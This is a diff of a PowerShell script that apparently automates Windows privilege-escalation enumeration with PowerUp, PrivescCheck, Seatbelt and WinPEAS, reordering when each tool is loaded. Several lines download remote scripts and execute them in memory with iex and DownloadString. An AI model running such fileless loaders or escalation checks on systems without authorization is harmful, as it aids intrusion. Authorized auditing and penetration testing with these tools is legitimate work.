@@ -15,18 +15,6 @@ $PATH = "~/Documents/" + $DATE + "_" + "AWPEC" + "\"
 # create RW directory
 New-Item -ItemType Directory -Force -Path $PATH | Out-Null
 cd $PATH 
-                   
-# downloading relevant third party resources
-# ------------------------------------------
-
-Write-Host "[INFO] Downloading PowerUp into Memory" -ForegroundColor Gray
-iex(New-Object Net.WebClient).DownloadString("https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1")
-
-Write-Host "[INFO] Downloading PrivescCheck into Memory" -ForegroundColor Gray
-iex(New-Object Net.WebClient).DownloadString("https://github.com/itm4n/PrivescCheck/raw/master/PrivescCheck.ps1")
-
-Write-Host "[INFO] Downloading PowerSharpPack into Memory" -ForegroundColor Gray
-iex(New-Object net.webclient).DownloadString("https://github.com/S3cur3Th1sSh1t/PowerSharpPack/raw/master/PowerSharpPack.ps1")
 
 # executing third party resources
 # ------------------------------------------
@@ -34,6 +22,8 @@ iex(New-Object net.webclient).DownloadString("https://github.com/S3cur3Th1sSh1t/
 systeminfo > systeminfo.txt
 whoami /all > whoami.txt
 
+Write-Host "[INFO] Downloading PowerUp into Memory" -ForegroundColor Gray
+iex(New-Object Net.WebClient).DownloadString("https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1")
 New-Item -ItemType Directory -Force -Path "PowerUp" | Out-Null; cd PowerUp
 Write-Host "[RUN] Executing PowerUp - be patient!" -ForegroundColor Yellow
 Invoke-AllChecks > powerup_results.txt
@@ -44,14 +34,18 @@ cd ..
 #PowerSharpPack -sharpup -Command "Audit" > sharpup_results.txt
 #cd ..
 
-New-Item -ItemType Directory -Force -Path "Seatbelt" | Out-Null; cd Seatbelt
-Write-Host "[RUN] Executing Seatbelt - be patient!" -ForegroundColor Yellow
-PowerSharpPack -seatbelt -Command "-group=all" > seatbelt_results.txt
-cd ..
-
+Write-Host "[INFO] Downloading PrivescCheck into Memory" -ForegroundColor Gray
+iex(New-Object Net.WebClient).DownloadString("https://github.com/itm4n/PrivescCheck/raw/master/PrivescCheck.ps1")
 New-Item -ItemType Directory -Force -Path "PrivescCheck" | Out-Null; cd PrivescCheck
 Write-Host "[RUN] Executing PrivescCheck - be patient!" -ForegroundColor Yellow
 Invoke-PrivescCheck -Report PrivescCheck_$env:computername -Format TXT,CSV,HTML,XML -Extended | Out-Null
+cd ..
+
+Write-Host "[INFO] Downloading PowerSharpPack into Memory" -ForegroundColor Gray
+iex(New-Object net.webclient).DownloadString("https://github.com/S3cur3Th1sSh1t/PowerSharpPack/raw/master/PowerSharpPack.ps1")
+New-Item -ItemType Directory -Force -Path "Seatbelt" | Out-Null; cd Seatbelt
+Write-Host "[RUN] Executing Seatbelt - be patient!" -ForegroundColor Yellow
+PowerSharpPack -seatbelt -Command "-group=all" > seatbelt_results.txt
 cd ..
 
 New-Item -ItemType Directory -Force -Path "WinPEAS" | Out-Null; cd WinPEAS
